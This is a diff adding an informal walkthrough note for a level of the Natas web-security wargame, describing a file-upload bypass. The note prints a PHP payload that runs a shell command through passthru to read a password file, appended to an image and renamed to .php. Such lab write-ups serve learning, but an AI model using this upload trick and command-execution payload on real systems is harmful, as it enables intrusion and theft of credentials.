@@ -146,3 +146,12 @@ i really cheated
 but anouther way put your commands somehow in shape of php so we are done
 u can also use ai to genereta a php codes 
 ------------------------------------------------------------------------------------------------------------------------------------------
+
+natas14
+
+uploade a single pixel 
+but use burpsuit and add this command at the end 
+<?php echo passthru('cat /etc/natas_webpass/natas14') ?>
+after that change first of the png or gpeg to php
+thats done
+------------------------------------------------------------------------------------------------------------------------------------------
